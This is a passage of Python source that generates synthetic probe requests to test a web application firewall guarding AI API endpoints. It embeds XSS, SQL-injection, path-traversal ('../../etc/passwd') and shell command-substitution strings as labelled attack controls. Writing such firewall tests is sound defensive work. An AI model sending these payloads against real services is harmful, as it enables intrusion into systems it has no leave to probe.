            {"role": "user", "content": "Review this inert execution history."}]}

    diff = "\n".join("+" + line for line in text.splitlines()) + "\n"
    variants = [
        ("native-local-command", "input[].action.command[]", history({**local,
            "action": {**local["action"], "command": ["sh", "-c", text]}}, local_output)),
        ("native-shell-command", "input[].action.commands[]", history({**shell,
            "action": {"commands": [text]}}, shell_output)),
        ("native-local-output", "input[].output", history(local, {**local_output, "output": text})),
        ("native-shell-stdout", "input[].output[].stdout", history(shell, {**shell_output,
            "output": [{**shell_output["output"][0], "stdout": text}]})),
        ("native-shell-stderr", "input[].output[].stderr", history(shell, {**shell_output,
            "output": [{**shell_output["output"][0], "stderr": text}]})),
        ("native-patch-output", "input[].output", history(patch, {**patch_output, "output": text})),
    ]
    for operation, patch_text in (("create_file", diff), ("update_file", "@@\n" + diff)):
        variants.append(("native-patch-" + operation.replace("_file", ""), "input[].operation.diff",
            history({**patch, "operation": {**patch["operation"],
                "type": operation, "diff": patch_text}}, patch_output)))
    return variants


def ai_coding_probes(routes: list[Route]) -> list[Probe]:
    """Build a small, standalone Responses/Chat coding-content regression set.

    These are anonymous invalid-model canaries. Their tool calls, results and
    namespace definitions are synthetic API input history, never instructions
    executed by this program. Native content arrays produce flattened WAF paths
    such as input.output.text; artificial output objects would test a different,
    invalid request shape. Successful transit is not model feature success.
    """
    values = (
        ("php-variable-function", '$formatter = "strtolower"; $formatter("SYNTHETIC");'),
        ("sql-source", "Explain this inert SQL example: " + CONTROL_SQL),
        ("html-source", '<script>console.log("synthetic")</script><a style="color:blue" href="javascript:void(0)">example</a>'),
        ("shell-source", "Explain inert shell source: $(printf synthetic); cat /etc/example.conf | sed 's/a/b/'"),
        ("powershell-source", 'Explain inert PowerShell: $code = { param($value) $value }; & $code "synthetic"'),
    )
    candidates = [route for route in routes if route.target == "gateway" and
                  (route.method, route.path) in CANARY_ROUTES]
    if len(candidates) != 2 or {route.path for route in candidates} != {path for _, path in CANARY_ROUTES}:
        raise ValueError("AI coding probes require exactly the published Responses and Chat POST contracts")
    grammar = r"(?:SELECT|UNION|<script>|\$formatter\(.*\)|\$\(printf synthetic\))"
    return _coding_content_probes(routes, values, grammar)


def _coding_content_probes(routes: list[Route], values: tuple[tuple[str, str], ...], grammar: str) -> list[Probe]:
    """Share native API envelopes between coding and single-signature probes."""
    candidates = [route for route in routes if route.target == "gateway" and
                  (route.method, route.path) in CANARY_ROUTES]
    mixed = "Review inert documentation only:\n" + "\n".join(text for _, text in values)
    schema = {"$schema": "https://json-schema.org/draft-07/schema#", "type": "object",
              "properties": {"sample": {"type": "string", "description": mixed},
                             "SELECT sample": {"type": "string", "default": "<div>synthetic</div>"}},
              "additionalProperties": False}
    cases = []
    for route in sorted(candidates, key=lambda item: item.path):
        is_responses = route.path.endswith("/responses")
        base = {"model": INVALID_MODEL, "store": False}
        if is_responses:
            base.update(input="Synthetic coding documentation", max_output_tokens=1)
        else:
            base.update(messages=[{"role": "user", "content": "Synthetic coding documentation"}], max_completion_tokens=1)

        def add(label: str, field_name: str, value: dict, *, intent: str = "compatibility", query=(), path=None):
            target = replace(route, path=path) if path else route
            cases.append(_probe(target, "ai-coding-" + label, "ai-coding-" + label, intent=intent,
                body=json_bytes(value), headers=[("Content-Type", "application/json")], query=query, payload_field=field_name))

        for label, text in values:
            arguments = json_bytes({"source": text}).decode()
            if is_responses:
                add(label + "-input", "input", {**base, "input": text})
                add(label + "-message", "input[].content[].text", {**base, "input": [
                    {"role": "user", "content": [{"type": "input_text", "text": text}]}]})
                history = [{"role": "user", "content": "Review the synthetic tool output."},
                    {"type": "function_call", "call_id": "call_waf_probe", "name": "synthetic_probe", "arguments": "{}"}]
                add(label + "-tool-string", "input[].output", {**base, "input": history + [
                    {"type": "function_call_output", "call_id": "call_waf_probe", "output": text},
                    {"role": "user", "content": "Continue the review."}]})
                add(label + "-tool-parts", "input[].output[].text", {**base, "input": history + [
                    {"type": "function_call_output", "call_id": "call_waf_probe", "output": [{"type": "input_text", "text": text}]},
                    {"role": "user", "content": "Continue the review."}]})
                add(label + "-custom-input", "input[].input", {**base, "input": [
                    {"role": "user", "content": "Review this synthetic custom tool call."},
                    {"type": "custom_tool_call", "call_id": "call_waf_custom", "name": "synthetic_custom", "input": text},
                    {"type": "custom_tool_call_output", "call_id": "call_waf_custom", "output": "Synthetic result"},
                    {"role": "user", "content": "Continue the review."}]})
            else:
                add(label + "-message", "messages[].content", {**base, "messages": [{"role": "user", "content": text}]})
                add(label + "-message-parts", "messages[].content[].text", {**base, "messages": [
                    {"role": "user", "content": [{"type": "text", "text": text}]}]})
                call = {"id": "call_waf_probe", "type": "function", "function": {"name": "synthetic_probe", "arguments": arguments}}
                add(label + "-function-arguments", "messages[].tool_calls[].function.arguments", {**base, "messages": [
                    {"role": "user", "content": "Review these synthetic function arguments."},
                    {"role": "assistant", "tool_calls": [call]},
                    {"role": "tool", "tool_call_id": "call_waf_probe", "content": "Synthetic result"},
                    {"role": "user", "content": "Continue the review."}]})
                add(label + "-tool-parts", "messages[].content[].text", {**base, "messages": [
                    {"role": "user", "content": "Review the synthetic tool output."},
                    {"role": "assistant", "tool_calls": [{**call, "function": {"name": "synthetic_probe", "arguments": "{}"}}]},
                    {"role": "tool", "tool_call_id": "call_waf_probe", "content": [{"type": "text", "text": text}]},
                    {"role": "user", "content": "Continue the review."}]})
                add(label + "-custom-input", "messages[].tool_calls[].custom.input", {**base, "messages": [
                    {"role": "user", "content": "Review this synthetic custom tool call."},
                    {"role": "assistant", "tool_calls": [{"id": "call_waf_custom", "type": "custom",
                        "custom": {"name": "synthetic_custom", "input": text}}]},
                    {"role": "tool", "tool_call_id": "call_waf_custom", "content": "Synthetic result"},
                    {"role": "user", "content": "Continue the review."}]})
            for variant, field_name, value in _conversation_data_variants(
                base, is_responses, text,
            ):
                if not field_name.startswith("keys:"):
                    add(label + "-" + variant, field_name, value)

        function = {"name": "synthetic_probe", "description": mixed, "parameters": schema, "strict": False}
        if is_responses:
            add("instructions", "instructions", {**base, "instructions": mixed})
            add("string-message", "input[].content", {**base, "input": [{"role": "user", "content": mixed}]})
            add("function-definition", "tools[].description", {**base, "tools": [{"type": "function", **function}]})
            add("function-schema", "tools[].parameters", {**base, "tools": [{"type": "function", **function, "description": "Synthetic function"}]})
            add("output-schema", "text.format.schema", {**base, "text": {"format": {
                "type": "json_schema", "name": "synthetic_probe", "strict": False, "schema": schema}}})
            for label, child, field_name in (
                ("nested-description", {"type": "function", **function, "parameters": {"type": "object", "properties": {}}}, "input[].tools[].tools[].description"),
                ("nested-schema", {"type": "function", **function, "description": "Synthetic function"}, "input[].tools[].tools[].parameters"),
                ("nested-grammar", {"type": "custom", "name": "synthetic_custom", "format": {
                    "type": "grammar", "syntax": "regex", "definition": grammar}}, "input[].tools[].tools[].format.definition"),
            ):
                add(label, field_name, {**base, "input": [
                    {"type": "tool_search_call", "call_id": "call_waf_search", "arguments": {"query": "synthetic"}, "execution": "client"},
                    {"type": "tool_search_output", "call_id": "call_waf_search", "execution": "client", "tools": [
                        {"type": "namespace", "name": "synthetic_namespace", "description": "Synthetic namespace", "tools": [child]}]},
                    {"role": "user", "content": "Review the synthetic tool definition."}]})
        else:
            add("function-definition", "tools[].function.description", {**base, "tools": [{"type": "function", "function": function}]})
            add("function-schema", "tools[].function.parameters", {**base, "tools": [{"type": "function", "function": {**function, "description": "Synthetic function"}}]})
            add("output-schema", "response_format.json_schema.schema", {**base, "response_format": {
                "type": "json_schema", "json_schema": {"name": "synthetic_probe", "strict": False, "schema": schema}}})
            add("legacy-definition", "functions[].description", {**base, "functions": [function]})
            add("legacy-schema", "functions[].parameters", {**base, "functions": [{**function, "description": "Synthetic function"}]})
            add("legacy-arguments", "messages[].function_call.arguments", {**base, "messages": [
                {"role": "user", "content": "Review these synthetic legacy arguments."},
                {"role": "assistant", "function_call": {"name": "synthetic_probe", "arguments": json_bytes({"source": mixed}).decode()}},
                {"role": "function", "name": "synthetic_probe", "content": "Synthetic result"},
                {"role": "user", "content": "Continue the review."}]})
            add("custom-description", "tools[].custom.description", {**base, "tools": [{"type": "custom",
                "custom": {"name": "synthetic_custom", "description": mixed, "format": {"type": "text"}}}]})
            add("custom-grammar", "tools[].custom.format.grammar.definition", {**base, "tools": [{"type": "custom",
                "custom": {"name": "synthetic_custom", "format": {"type": "grammar", "grammar": {"syntax": "regex", "definition": grammar}}}}]})

        # 動的キーはsourceの組合せ1種類で各データprefixを確認します。
        for variant, field_name, value in _conversation_data_variants(
            base, is_responses, mixed,
        ):
            if field_name.startswith("keys:"):
                add("data-key-" + variant, field_name, value)
                name = field_name.removeprefix("keys:").replace("[]", "")
                add("query-key-collision-" + variant, "query-keys:" + name,
                    base, intent="validation",
                    query=[(name + "." + CONTROL_SQL, "Synthetic value")])
                add("query-key-multiline-collision-" + variant, "query-keys:" + name,
                    base, intent="validation",
                    query=[(name + "." + mixed, "Synthetic value")])

        # Exact endpoint controls establish that the data exceptions do not
        # extend to unrelated body fields, query arguments, or adjacent paths.
        for label, payload in (("unknown-sqli", CONTROL_SQL), ("unknown-xss", "<script>alert(1)</script>")):
            add("control-" + label, "_attack", {**base, "_attack": payload}, intent="attack_control")
        add("control-query-sqli", "query:id", base, intent="attack_control", query=[("id", CONTROL_SQL)])
        add("control-model-sqli", "model", {**base, "model": CONTROL_SQL},
            intent="attack_control")
        cases.append(_probe(
            route, "ai-coding-control-header-sqli", "ai-coding-control-header-sqli",
            intent="attack_control", body=json_bytes(base),
            headers=[("Content-Type", "application/json"), ("X-Attack", CONTROL_SQL)],
            payload_field="header:X-Attack"))
        if is_responses:
            add("control-arguments-sibling", "input[].argumentsExtra", {
                **base, "input": [{"type": "tool_search_call",
                    "call_id": "call_waf_search", "arguments": {"query": "Synthetic query"},
                    "argumentsExtra": CONTROL_SQL, "execution": "client"}]},
                intent="attack_control")
            add("control-schema-sibling", "input[].tools[].parametersExtra", {
                **base, "input": [{"type": "tool_search_output",
                    "call_id": "call_waf_search", "execution": "client", "tools": [
                        {"type": "function", "name": "synthetic_probe",
                         "parametersExtra": CONTROL_SQL}]}]}, intent="attack_control")
            for name in ("command", "commands"):
                action = {name: ["printf synthetic"], name + "Extra": [CONTROL_SQL]}
                call = {"type": "local_shell_call" if name == "command" else "shell_call",
                        "call_id": "call_waf_native_control", "action": action}
                if name == "command":
                    call.update(id="ls_waf_native_control", status="completed")
                    action.update(type="exec", env={})
                add("control-native-" + name + "-sibling", "input[].action." + name + "Extra[]",
                    {**base, "input": [call]}, intent="attack_control")
            add("control-native-diff-sibling", "input[].operation.diffExtra", {**base,
                "input": [{"type": "apply_patch_call", "call_id": "call_waf_patch_control",
                    "status": "completed", "operation": {"type": "create_file",
                        "path": "synthetic-probe.txt", "diff": "+Synthetic file\n",
                        "diffExtra": CONTROL_SQL}}]}, intent="attack_control")
            for name in ("stdout", "stderr"):
                output = {"stdout": "Synthetic stdout", "stderr": "",
                          "outcome": {"type": "exit", "exit_code": 0}, name + "Extra": CONTROL_SQL}
                add("control-native-" + name + "-sibling", "input[].output[]." + name + "Extra",
                    {**base, "input": [{"type": "shell_call_output", "call_id": "call_waf_shell_control",
                        "output": [output]}]}, intent="attack_control")
        else:
            add("control-reasoning-sibling", "messages[].reasoning_contentExtra", {**base,
                "messages": [{"role": "assistant", "content": "Synthetic final answer",
                    "reasoning_contentExtra": CONTROL_SQL}]}, intent="attack_control")
        neighbor = {**base, "input": "<script>alert(1)</script>"} if is_responses else {
            **base, "messages": [{"role": "user", "content": "<script>alert(1)</script>"}]}
        add("control-neighbor-xss", "input" if is_responses else "messages[].content", neighbor,
            intent="attack_control", path=route.path + "/neighbor")
        for name in (("input.output.text", "input.input") if is_responses else ("messages.content", "messages.tool_calls.custom.input")):
            add("query-collision-" + name.replace(".", "-"), "query:" + name, base,
                intent="validation", query=[(name, CONTROL_SQL)])
        names = {field_name.replace("[]", "")
                 for _, field_name, _ in _conversation_data_variants(base, is_responses, CONTROL_SQL)
                 if not field_name.startswith("keys:")}
        for name in sorted(names):
            add("query-collision-data-" + name.replace(".", "-"), "query:" + name,
                base, intent="validation", query=[(name, CONTROL_SQL)])
    return cases


def _image_prompt_body(route: Route, text: str, *, extra: dict | None = None) -> tuple[bytes, str]:
    """Use native image JSON/multipart envelopes with invalid model canaries."""
    if route.body_format == "multipart":
        boundary = "waf-probe-image-boundary"
        output = io.BytesIO()
        fields = {"model": INVALID_MODEL, "prompt": text, "n": "1", "size": "1024x1024", **(extra or {})}
        for name, value in fields.items():
            output.write((f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n').encode())
        for name, transparent in (("image", False), ("mask", True)):
            output.write((f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"; filename="synthetic-{name}.png"\r\nContent-Type: image/png\r\n\r\n').encode())
            output.write(_binary_fixture("image/png", "Synthetic image boundary fixture", transparent=transparent))
            output.write(b"\r\n")
        output.write((f"--{boundary}--\r\n").encode())
        return output.getvalue(), "multipart/form-data; boundary=" + boundary
    if route.target == "portal":
        value = {"apiKeyId": "portal-00000000-0000-4000-8000-000000000001", "modelId": INVALID_MODEL,
                 "prompt": text, "size": "1024x1024", "quality": "low", "width": 512, "height": 512, "outputFormat": "png"}
    elif route.path.startswith("/models/blackforestlabs/"):
        value = {"model": INVALID_MODEL, "prompt": text, "width": 512, "height": 512, "num_images": 1, "output_format": "png"}
        if route.path.endswith("/edits"):
            value["input_image"] = base64.b64encode(_binary_fixture("image/png", "Synthetic reference image")).decode()
    else:
        value = {"model": INVALID_MODEL, "prompt": text, "n": 1, "size": "1024x1024", "quality": "low"}
    return json_bytes({**value, **(extra or {})}), "application/json"


def image_prompt_probes(routes: list[Route]) -> list[Probe]:
    """Build a separate bounded image prompt/data-versus-control corpus.

    All probes omit credentials, including portal requests. An invalid model
    remains in every body; approved deployment paths come only from the route
    inventory. The finite fixtures test WAF transit, not image generation or
    image decoding. No model call, file upload, or inference is authorized by a
    passing anonymous canary. Portal Origin, if required, belongs in the runner.
    """
    candidates = [route for route in routes if route.method == "POST" and (
        route.target == "gateway" and route.operation.split(":")[0] in {"openai-images-v1", "blackforest-images-v1"}
        or route.target == "portal" and route.path == "/api/models/images")]
    counts = Counter(route.target for route in candidates)
    if counts != {"gateway": 6, "portal": 1} or len({(route.target, route.path) for route in candidates}) != 7:
        raise ValueError("image prompt probes require the six published image POST paths and the portal image POST contract")
    prompts = (
        ("php-variable-function", 'Draw a code card displaying this inert PHP example: $formatter = "strtolower"; $formatter("SYNTHETIC");'),
        ("sql-source", "Draw a SQL training card displaying this inert example: " + CONTROL_SQL),
        ("html-source", '<script>console.log("synthetic")</script><a href="javascript:void(0)" style="color:blue">Draw this markup as source text.</a>'),
        ("shell-source", "Draw a terminal tutorial card displaying inert shell source: $(printf synthetic); cat /etc/example.conf"),
        ("rfi-url", "Draw a documentation card displaying this example URL as text: https://example.invalid/reference/source.txt?sample=1"),
        ("path-source", r"Draw a source-control diagram with literal path labels: ../../etc/passwd C:\work\synthetic\sample.php /etc/example.conf"),
    )
    cases = []
    for route in sorted(candidates, key=lambda item: (item.target, item.path)):
        def add(label: str, prompt: str, *, intent: str = "compatibility", extra=None, query=(), path=None, field_name="prompt"):
            body, mime = _image_prompt_body(route, prompt, extra=extra)
            target = replace(route, path=path) if path else route
            cases.append(_probe(target, "image-prompts-" + label, "image-prompts-" + label, intent=intent,
                body=body, headers=[("Content-Type", mime)], query=query, payload_field=field_name))

        baseline = "Draw a blue square on a white background. Synthetic WAF fixture."
        add("baseline", baseline)
        for label, prompt in prompts:
            add(label, prompt)
        for label, value in (("unknown-sqli", CONTROL_SQL), ("unknown-xss", "<script>alert(1)</script>")):
            add("control-" + label, baseline, intent="attack_control", extra={"_attack": value}, field_name="_attack")
        add("control-query-sqli", baseline, intent="attack_control", query=[("id", CONTROL_SQL)], field_name="query:id")
        add("control-neighbor-xss", "<script>alert(1)</script>", intent="attack_control", path=route.path + "/neighbor")
        add("query-collision-prompt", baseline, intent="validation", query=[("prompt", CONTROL_SQL)], field_name="query:prompt")
        if route.target == "gateway" and route.path == "/models/blackforestlabs/v1/flux-2/edits":
            for label, metadata_text in (("plain", "Synthetic reference image"), ("sql-text", CONTROL_SQL),
                                         ("punctuation", "Synthetic PNG comment: ;'\"()<>[]{}=+-/*" * 8)):
                image = base64.b64encode(_binary_fixture("image/png", metadata_text)).decode()
                add("flux-base64-" + label, baseline, extra={"input_image": image}, field_name="input_image")
    ids = [case.case_id for case in cases]
    if len(ids) != len(set(ids)):
        raise ValueError("duplicate image prompt case IDs")
    return cases


def opaque_fixture(alphabet: str, length: int, seed: int, *, hex_signature: bool = False) -> str:
    """Produce canonical encoded synthetic bytes, never real reasoning ciphertext.

    Normal seeds are unfiltered. The targeted variant deliberately includes the
    SQL hex signature using legal encoding characters; it still decodes exactly.
    This construction proves encoding/shape only, not encryption or a valid MAC.
    """
    if alphabet not in {"base64", "base64url"} or length < 128 or length % 4 or seed not in (0, 1):
        raise ValueError("bounded synthetic opaque encoding required")
    size = length * 3 // 4
    label = f"synthetic-waf-opaque:{alphabet}:{length}:{seed}:".encode()
    raw = b"".join(hashlib.sha256(label + str(index).encode()).digest()
                   for index in range((size + 31) // 32))[:size]
    encode = base64.b64encode if alphabet == "base64" else base64.urlsafe_b64encode
    value = encode(raw).decode()
    if hex_signature:
        marker = "G0x" + ("abc" if seed == 0 else "1234567890abcdef" * 4)
        value = value[:64] + marker + value[64 + len(marker):]
    pattern = r"[A-Za-z0-9+/]+" if alphabet == "base64" else r"[A-Za-z0-9_-]+"
    decoded = base64.b64decode(value, altchars=None if alphabet == "base64" else b"-_", validate=True)
    if (len(value) != length or not re.fullmatch(pattern, value)
            or len(decoded) != size or encode(decoded).decode() != value
            or hex_signature and not OPAQUE_HEX_SIGNATURE.search(value)):
        raise ValueError("synthetic opaque encoding failed its round-trip check")
    return value


def large_conversation_fixture(is_responses: bool) -> dict:
    """Build an exact 600 KiB UTF-8 JSON conversation, not a non-JSON size blob."""
    source = ("Synthetic source review 文書 😀\nSELECT id FROM example WHERE value='safe';\n"
              '<script>console.log("synthetic")</script>\n'
              "$(printf synthetic); $values=@(1,2); ../example/source.txt\n"
              "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n"
              '{"message":"synthetic", "escaped":"\\r\\n\\u0000"}\n')
    schema = {"type": "object", "properties": {"source": {"type": "string", "description": source},
              "options": {"type": "array", "items": {"type": "string", "enum": [source, "synthetic"]}}},
              "required": ["source"], "additionalProperties": False}
    functions = [{"name": "synthetic_review_" + str(index), "description": source,
                  "parameters": schema, "strict": False} for index in range(3)]
    history = []
    if is_responses:
        history.append({"id": "rs_waf_synthetic_history", "type": "reasoning",
                        "summary": [{"type": "summary_text", "text": source}],
                        "encrypted_content": opaque_fixture("base64url", 4096, 0, hex_signature=True)})
    target = None
    for turn in range(8):
        user_text = ("SYNTHETIC_REQUEST_START " if turn == 0 else "Synthetic follow-up ") + source
        call_id = "call_waf_synthetic_" + str(turn)
        name = functions[turn % len(functions)]["name"]
        arguments = json_bytes({"source": source, "options": ["synthetic", "文書"]}).decode()
        if is_responses:
            history.extend([{"role": "user", "content": [{"type": "input_text", "text": user_text}]},
                {"type": "function_call", "call_id": call_id, "name": name, "arguments": arguments},
                {"type": "function_call_output", "call_id": call_id, "output": source},
                {"role": "assistant", "content": [{"type": "output_text", "text": source, "annotations": []}]}])
            if turn == 3:
                target, key = history[-2], "output"
        else:
            history.extend([{"role": "user", "content": user_text},
                {"role": "assistant", "content": None, "tool_calls": [{"id": call_id, "type": "function",
                    "function": {"name": name, "arguments": arguments}}]},
                {"role": "tool", "tool_call_id": call_id, "content": source},
                {"role": "assistant", "content": source}])
            if turn == 3:
                target, key = history[-2], "content"
    history.append({"role": "user", "content": "SYNTHETIC_REQUEST_END Continue the synthetic review. 文書"})
    value = {"model": INVALID_MODEL, "stream": False,
             "input" if is_responses else "messages": history,
             "tools": [{"type": "function", **function} if is_responses else
                       {"type": "function", "function": function} for function in functions]}
    value.update({"store": False, "max_output_tokens": 1} if is_responses else {"max_completion_tokens": 1})
    target[key] = source + "SYNTHETIC_HISTORY_MIDDLE " + source
    missing = TYPED_HISTORY_BYTES - len(json_bytes(value))
    chunk_size = len(json_bytes(source)) - 2
    repeats, remainder = divmod(missing, chunk_size)
    if missing < 0 or repeats < 2:
        raise ValueError("synthetic conversation exceeds its fixed byte budget")
    target[key] = (source + source * (repeats // 2) + "SYNTHETIC_HISTORY_MIDDLE "
                   + source * (repeats - repeats // 2) + source + " " * remainder)
    if len(json_bytes(value)) != TYPED_HISTORY_BYTES:
        raise ValueError("synthetic UTF-8 conversation byte count differs")
    return value


def ticket_fixture(seed: int, *, hex_signature: bool = False) -> str:
    """Use a JSON Base64url payload plus a canonical 32-byte synthetic MAC slot."""
    payload = base64.urlsafe_b64encode(json_bytes({"synthetic": True, "nonce": seed})).decode().rstrip("=")
    signature = base64.urlsafe_b64encode(hashlib.sha256(f"synthetic-ticket:{seed}".encode()).digest()).decode().rstrip("=")
    if hex_signature:
        marker = "G0x" + ("abc" if seed == 0 else "1234567890abcdef")
        signature = signature[:4] + marker + signature[4 + len(marker):]
    decoded = base64.urlsafe_b64decode(signature + "=")
    if len(signature) != 43 or len(decoded) != 32 or base64.urlsafe_b64encode(decoded).decode().rstrip("=") != signature:
        raise ValueError("synthetic ticket signature slot must decode canonically")
    return payload + "." + signature


def typed_data_probes(routes: list[Route]) -> list[Probe]:
    """Separate real data types, large valid history, and exclusion controls.

    These anonymous, synthetic fixtures validate WAF transit only. Encoded bytes,
    tickets, handles and audio IDs are deliberately not issued by a provider or
    signed by an application secret. A 401/400 is not model or application success.
    """
    indexed = {(route.target, route.method, route.path): route for route in routes}
    cases = []

    def add(route, label, data_type, field_name, value=None, *, body=None,
            mime="application/json", headers=(), query=(), intent="compatibility", path=None):
        target = replace(route, path=path) if path else route
        if body is None and value is not None:
            body = json_bytes(value)
        cases.append(_probe(target, "typed-" + label, "typed-" + data_type,
            intent=intent, body=body, headers=([("Content-Type", mime)] if mime else []) + list(headers),
            query=query, payload_field=field_name, data_type=data_type))

    responses = indexed.get(("gateway", "POST", "/models/openai/v1/responses"))
    chat = indexed.get(("gateway", "POST", "/models/openai/v1/chat/completions"))

    def reasoning(token):
        return {"model": INVALID_MODEL, "store": False, "max_output_tokens": 1,
                "input": [{"id": "rs_waf_synthetic_opaque", "type": "reasoning", "summary": [],
                           "encrypted_content": token}, {"role": "user", "content": "Synthetic continuation"}]}

    if responses:
        for alphabet in ("base64", "base64url"):
            for length in (512, 4096, 16384):
                for seed in (0, 1):
                    for targeted in (False, True):
                        label = f"reasoning-{alphabet}-{length}-seed{seed}-" + ("hex" if targeted else "normal")
                        add(responses, label, "opaque-" + alphabet, "input[].encrypted_content",
                            reasoning(opaque_fixture(alphabet, length, seed, hex_signature=targeted)))
        baseline = reasoning(opaque_fixture("base64url", 512, 0))
        signature = opaque_fixture("base64url", 512, 1, hex_signature=True)
        sibling = json.loads(json_bytes(baseline))
        sibling["input"][0]["encrypted_content_extra"] = signature
        add(responses, "reasoning-sibling", "opaque-base64url", "input[].encrypted_content_extra",
            sibling, intent="attack_control")
        add(responses, "reasoning-query", "opaque-base64url", "query:input.encrypted_content",
            baseline, query=[("input.encrypted_content", signature)], intent="validation")
        add(responses, "reasoning-header", "opaque-base64url", "header:X-Waf-Unknown",
            baseline, headers=[("X-Waf-Unknown", signature)], intent="attack_control")
        add(responses, "reasoning-neighbor", "opaque-base64url", "input[].encrypted_content",
            reasoning(signature), path=responses.path + "/neighbor", intent="attack_control")
        add(responses, "client-metadata", "metadata", "client_metadata.x-codex-turn-metadata",
            {**baseline, "client_metadata": {"x-codex-turn-metadata": json_bytes({
                "turn_id": "synthetic-turn", "client": "synthetic-waf-fixture"}).decode()}})
    for route, is_responses in ((responses, True), (chat, False)):
        if route:
            add(route, "large-responses-history" if is_responses else "large-chat-history",
                "conversation", "input+tools" if is_responses else "messages+tools",
                large_conversation_fixture(is_responses))

    # Actual media structures are encoded without overwriting Base64 text.
    # The PDF has object/xref tables; WAV has PCM frames; PNG has CRC-checked chunks.
    png = base64.b64encode(_binary_fixture("image/png", "Synthetic media fixture")).decode()
    pdf = base64.b64encode(_raw_guard_pdf("Synthetic document fixture")).decode()
    wav = base64.b64encode(_binary_fixture("audio/wav", "Synthetic audio fixture")).decode()
    if responses:
        for label, part, field_name in (
            ("response-png", {"type": "input_image", "image_url": "data:image/png;base64," + png}, "input[].content[].image_url"),
            ("response-pdf", {"type": "input_file", "filename": "synthetic.pdf", "file_data": "data:application/pdf;base64," + pdf}, "input[].content[].file_data"),
            ("response-url", {"type": "input_image", "image_url": "https://example.invalid/synthetic.png"}, "input[].content[].image_url"),
        ):
            add(responses, label, "url" if label.endswith("url") else "media-data-url", field_name,
                {"model": INVALID_MODEL, "store": False, "max_output_tokens": 1,
                 "input": [{"role": "user", "content": [{"type": "input_text", "text": "Synthetic media"}, part]}]})
    if chat:
        for label, part, field_name, kind in (
            ("chat-png", {"type": "image_url", "image_url": {"url": "data:image/png;base64," + png}}, "messages[].content[].image_url.url", "media-data-url"),
            ("chat-audio", {"type": "input_audio", "input_audio": {"data": wav, "format": "wav"}}, "messages[].content[].input_audio.data", "media-base64"),
            ("chat-file", {"type": "file", "file": {"filename": "synthetic.pdf", "file_data": "data:application/pdf;base64," + pdf}}, "messages[].content[].file.file_data", "media-data-url"),
        ):
            add(chat, label, kind, field_name, {"model": INVALID_MODEL, "max_completion_tokens": 1,
                "messages": [{"role": "user", "content": [{"type": "text", "text": "Synthetic media"}, part]}]})
        for seed in (0, 1):
            for targeted in (False, True):
                audio_id = "audio_" + opaque_fixture("base64url", 512, seed, hex_signature=targeted)
                add(chat, f"chat-audio-id-seed{seed}-" + ("hex" if targeted else "normal"), "opaque-id",
                    "messages[].audio.id", {"model": INVALID_MODEL, "max_completion_tokens": 1, "messages": [
                        {"role": "assistant", "content": None, "audio": {"id": audio_id}},
                        {"role": "user", "content": "Synthetic audio continuation"}]})
    for path, prefix in (("/api/models/realtime/stop", "r1."), ("/api/tools/documents/status", "")):
        route = indexed.get(("portal", "POST", path))
        if not route:
            continue
        def handle_body(token):
            return {"handle": prefix + token, **({"apiKeyId": "portal-00000000-0000-4000-8000-000000000001"} if not prefix else {})}
        for length in (512, 4096, 12000):
            for seed in (0, 1):
                for targeted in (False, True):
                    add(route, f"handle-{length}-seed{seed}-" + ("hex" if targeted else "normal"),
                        "opaque-base64url", "handle", handle_body(opaque_fixture("base64url", length, seed, hex_signature=targeted)))
        signature = opaque_fixture("base64url", 512, 1, hex_signature=True)
        baseline = handle_body(opaque_fixture("base64url", 512, 0))
        add(route, "handle-sibling", "opaque-base64url", "handle_extra", {**baseline, "handle_extra": signature}, intent="attack_control")
        add(route, "handle-query", "opaque-base64url", "query:handle", baseline, query=[("handle", signature)], intent="validation")
        add(route, "handle-header", "opaque-base64url", "header:X-Waf-Unknown", baseline, headers=[("X-Waf-Unknown", signature)], intent="attack_control")
        add(route, "handle-neighbor", "opaque-base64url", "handle", handle_body(signature), path=route.path + "/neighbor", intent="attack_control")

    for route in routes:
        ticket_name = ("X-Core-Document-Ticket" if route.target == "gateway" and route.constraint.get("kind") == "documentAnalysisStatus"
                       else "X-Core-Call-Ticket" if route.target == "gateway" and ("/calls/" in route.path and route.path.endswith("/hangup")
                           or route.path == "/models/openai-realtime/v1/observer/") else None)
        if not ticket_name:
            continue
        if ticket_name == "X-Core-Document-Ticket":
            route = replace(route, path=route.path.rsplit("/", 1)[0] + "/00000000-0000-4000-8000-000000000000")
            neighbor = route.path.replace("/operations/", "/operation-neighbor/")
        else:
            neighbor = route.path.replace("/calls/", "/call-neighbor/") if route.path.endswith("/hangup") else route.path + "neighbor"
        query = [("call_id", PARAMETER_VALUES["callId"])] if route.path.endswith("/observer/") else []
        for seed in (0, 1):
            for targeted in (False, True):
                add(route, f"ticket-seed{seed}-" + ("hex" if targeted else "normal"), "opaque-ticket",
                    "header:" + ticket_name, mime="", headers=[(ticket_name, ticket_fixture(seed, hex_signature=targeted))], query=query)
        signature, baseline = ticket_fixture(1, hex_signature=True), ticket_fixture(0)
        add(route, "ticket-sibling", "opaque-ticket", "header:" + ticket_name + "-Extra", mime="",
            headers=[(ticket_name, baseline), (ticket_name + "-Extra", signature)], query=query, intent="attack_control")
        add(route, "ticket-query", "opaque-ticket", "query:" + ticket_name, mime="",
            headers=[(ticket_name, baseline)], query=[*query, (ticket_name, signature)], intent="validation")
        add(route, "ticket-neighbor", "opaque-ticket", "header:" + ticket_name, mime="",
            headers=[(ticket_name, signature)], query=query, path=neighbor, intent="attack_control")
        if route.path.endswith("/hangup"):
            # The AppGW family pattern also selects unknown children; API route
            # rejection, rather than WAF blocking, is their required boundary.
            add(route, "ticket-family-unknown-operation", "opaque-ticket", "header:" + ticket_name, mime="",
                headers=[(ticket_name, signature)], path=route.path.rsplit("/", 1)[0] + "/neighbor", intent="validation")
    flux = indexed.get(("gateway", "POST", "/models/blackforestlabs/v1/flux-2/edits"))
    if flux:
        for label, image, kind in (("base64", png, "media-base64"),
                                   ("url", "https://example.invalid/synthetic.png", "url")):
            add(flux, "flux-image-" + label, kind, "input_image", {"model": INVALID_MODEL,
                "prompt": "Synthetic image edit", "input_image": image, "width": 512, "height": 512},
                intent="validation" if label == "url" else "compatibility")
        add(flux, "flux-image-2-base64", "media-base64", "input_image_2", {"model": INVALID_MODEL,
            "prompt": "Synthetic two-image edit", "input_image": png, "input_image_2": png, "width": 512, "height": 512})
    for route in routes:
        if route.target == "gateway" and route.method == "POST":
